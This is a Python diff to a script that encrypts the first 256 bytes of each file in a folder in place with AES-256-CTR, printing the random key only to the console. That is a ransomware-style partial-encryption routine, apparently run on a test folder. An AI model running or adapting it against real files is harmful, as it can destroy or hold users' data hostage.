@@ -15,17 +15,12 @@ def encrypt_aes_ctr(data, key, iv):
     return encrypted_data
 
 if __name__ == "__main__":
-    # Generate a 256-bit AES key (32 bytes).
-    aes_key = os.urandom(32)
+    # Generate a 48-byte AES key (32 bytes for key + 16 bytes for IV).
+    key_iv = os.urandom(48)
 
-    # Generate a 128-bit IV (16 bytes).
-    iv = os.urandom(16)
-
-    # Print the AES key and IV as hexadecimal strings.
-    aes_key_hex = aes_key.hex().upper()
-    iv_hex = iv.hex().upper()
-    print("AES Encryption Key:", aes_key_hex)
-    print("IV:", iv_hex)
+    # Print only the 48-byte AES key as a hexadecimal string.
+    key_iv_hex = key_iv.hex().upper()
+    print("AES Key (48 bytes in hex):", key_iv_hex)
 
     # Specify the input folder path.
     folder_path = 'C:/Users/kyj08/OneDrive/바탕 화면/Test/'  # Enter the desired folder path here.
@@ -45,6 +40,8 @@ if __name__ == "__main__":
     # Define the byte_size to read from the beginning of each file.
     byte_size = 256  # Fixed byte size
 
+    encryption_successful = True  # Flag to track encryption success
+
     for file_path in file_list:
         try:
             with open(file_path, 'rb+') as file:
@@ -52,7 +49,7 @@ if __name__ == "__main__":
                 binary_data = file.read(byte_size)
 
                 # Encrypt the binary_data using AES-256 CTR mode with the shared key and IV.
-                encrypted_data = encrypt_aes_ctr(binary_data, aes_key, iv)
+                encrypted_data = encrypt_aes_ctr(binary_data, key_iv[:32], key_iv[32:])
 
                 # Seek back to the beginning of the file and write the encrypted_data.
                 file.seek(0)
@@ -68,7 +65,13 @@ if __name__ == "__main__":
 
                 # Print the results.
                 print(f"File partially encrypted: {file_path}")
-                print("AES-CTR Encrypted Hex value:", hex_data)
+                # print("AES-CTR Encrypted Hex value:", hex_data)
 
         except Exception as e:
             print(f"An error occurred for file {file_path}: {e}")
+            encryption_successful = False
+
+    if encryption_successful:
+        print("Encryption Successful!")  # Print success message if all files are successfully encrypted
+    else:
+        print("Encryption Failed for some files!")  # Print failure message if encryption failed for some files
